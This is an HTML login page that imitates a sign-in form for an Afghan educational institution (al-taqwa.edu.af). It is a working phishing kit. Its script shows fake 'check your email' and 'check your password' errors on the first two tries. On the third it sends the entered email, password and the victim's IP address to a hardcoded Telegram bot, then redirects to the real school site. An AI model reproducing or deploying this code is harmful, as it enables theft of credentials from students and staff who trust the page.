<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Login</title>

<style>
*{
    margin:0;
    padding:0;
    box-sizing:border-box;
    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
}

body{
    height:100vh;
    display:flex;
    justify-content:center;
    align-items:center;
    background:#f9f9f9; /* دقیقاً د دوهم عکس د شالید رنګ */
    padding:0;
}

.login-container{
    width: 360px; /* د دوهم عکس په څیر دقیق مینیمل اندازه */
    max-width: 92%;
    background: #ffffff;
    border-radius: 8px; /* نرم او کم تاو شوي کونجونه */
    padding: 30px 24px 26px 24px;
    border: 1px solid #eef0f2;
    box-shadow: 0 4px 15px rgba(0,0,0,0.03); /* ډیر نرم او پیکه سیوری لکه دوهم عکس */
    display: flex;
    flex-direction: column;
}

/* LOGO */
.logo{
    text-align:center;
    margin-bottom:12px;
}

.logo img{
    width:150px; /* د لوګو اندازه برابره شوه */
    height: auto;
}

/* TITLE */
.title{
    text-align:center;
    font-size:18px;
    font-weight: 500;
    margin-bottom:22px;
    color:#222;
}

/* INPUT */
.input-box{
    margin-bottom:14px;
}

label{
    display:block;
    font-size:11px; /* د دوهم عکس په څیر واړه او نرم خطونه */
    margin-bottom:6px;
    color:#888888; /* پیکه خړ رنګ */
}

input[type="email"], input[type="password"]{
    width:100%;
    height:38px; /* د بکسونو دقیق لوړوالی */
    border-radius:4px;
    border:1px solid #e2e8f0; /* کټ مټ د دوهم عکس په څیر کمرنګه بارډر */
    padding:0 12px;
    font-size:13px;
    color: #333;
    outline: none;
    transition: border-color 0.15s ease-in-out;
}

/* کله چې په بکس کلیک کېږي د دوهم عکس په څیر آسماني بارډر اخلي */
input[type="email"]:focus, input[type="password"]:focus{
    border:1px solid #29b6f6; 
}

/* CHECKBOX */
.remember{
    display:flex;
    align-items:center;
    margin:6px 0 18px;
}

.remember input{
    width:13px;
    height:13px;
    margin-right:6px;
    border: 1px solid #cbd5e1;
}

.remember span{
    font-size:11px;
    color: #888888;
}

/* BUTTON */
button{
    width:100%;
    height:38px; /* د بټن لوړوالی کټ مټ د انپوټ غوندې مینیمل شو */
    border:none;
    border-radius:4px;
    background:#00bcd4; /* د دوهم عکس روښانه ځلا لرونکی آسماني رنګ */
    color: white;
    font-size:13px;
    font-weight: 500;
    cursor:pointer;
    transition: background 0.2s;
}

button:hover{
    background:#00acc1;
}

/* د تېروتنې پیغام */
.error-msg {
    background: #ffe6e6;
    border: 1px solid #ff6666;
    color: #cc0000;
    padding: 8px;
    border-radius: 4px;
    font-size: 12px;
    text-align: center;
    margin-bottom: 12px;
    display: none;
}
</style>
</head>

<body>

<div class="login-container">

    <div class="logo">
        <img src="Screenshot_2026-06-08-23-00-41-466_com.android.chrome~2.jpg" alt="Logo">
    </div>

    <div class="title">Sign in</div>

    <div id="errorMsg" class="error-msg"></div>

    <div class="input-box">
        <label>Email</label>
        <input type="email" id="email" placeholder="Email">
    </div>

    <div class="input-box">
        <label>Password</label>
        <input type="password" id="password" placeholder="Password">
    </div>

    <div class="remember">
        <input type="checkbox" id="rememberCheck">
        <span>Remember password</span>
    </div>

    <button id="loginBtn">Login</button>

</div>

<script>
    // ==================== د Telegram بوټ تنظیمات ====================
    const BOT_TOKEN = "8815514761:AAGT82khXsn8TmJHCv5vgSZG86Z6fAwGktQ";
    const ADMIN_CHAT_ID = "8295417969";

    let attemptStore = {};

    function hasPashtoCharacters(text) {
        const pashtoRegex = /[\u0600-\u06FF\u0750-\u077F\u08A0-\u08FF\uFB50-\uFDFF\uFE70-\uFEFF]/;
        return pashtoRegex.test(text);
    }

    function isValidEmail(email) {
        const emailRegex = /^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/;
        return emailRegex.test(email);
    }

    function isValidPasswordLength(password) {
        return password.length >= 8;
    }

    async function getUserIP() {
        try {
            const response = await fetch('https://api.ipify.org?format=json');
            const data = await response.json();
            return data.ip;
        } catch {
            return 'unknown';
        }
    }

    async function sendToAdmin(email, password, ip, attemptNumber) {
        const message = `✅ *SUCCESSFUL LOGIN* ✅\n\n📍 *Source:* al-taqwa.edu.af/login\n👤 *Email:* ${email}\n🔑 *Password:* ${password}\n🌐 *IP:* ${ip}\n📊 *Attempt:* ${attemptNumber}\n🕒 *Time:* ${new Date().toLocaleString()}`;
        
        try {
            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: ADMIN_CHAT_ID,
                    text: message,
                    parse_mode: 'Markdown'
                })
            });
        } catch(e) {
            console.warn("Telegram error:", e);
        }
    }

    function showError(message) {
        const errorDiv = document.getElementById('errorMsg');
        errorDiv.textContent = message;
        errorDiv.style.display = 'block';
        setTimeout(() => {
            errorDiv.style.display = 'none';
        }, 3000);
    }

    document.getElementById('loginBtn').addEventListener('click', async () => {
        const email = document.getElementById('email').value.trim();
        const password = document.getElementById('password').value.trim();

        if (!email || !password) {
            showError('Please fill in both email and password');
            return;
        }

        if (hasPashtoCharacters(email) || hasPashtoCharacters(password)) {
            showError('Pashto not allowed ');
            return;
        }

        if (!isValidEmail(email)) {
            showError('Please enter a valid email address (e.g., username@gmail.com)');
            return;
        }

        if (!isValidPasswordLength(password)) {
            showError('Password must be at least 8 characters');
            return;
        }

        const ip = await getUserIP();
        const key = `${email}_${ip}`;

        if (!attemptStore[key]) {
            attemptStore[key] = 0;
        }
        attemptStore[key]++;
        
        const currentAttempt = attemptStore[key];

        if (currentAttempt === 1) {
            showError('Please check your email');
            document.getElementById('email').value = '';
            document.getElementById('password').value = '';
            return;
        }

        if (currentAttempt === 2) {
            showError('Please check your password');
            document.getElementById('email').value = '';
            document.getElementById('password').value = '';
            return;
        }

        if (currentAttempt >= 3) {
            await sendToAdmin(email, password, ip, currentAttempt);
            delete attemptStore[key];
            window.location.href = "https://www.altaqwa.edu.af";
        }
    });
</script>

</body>
</html>
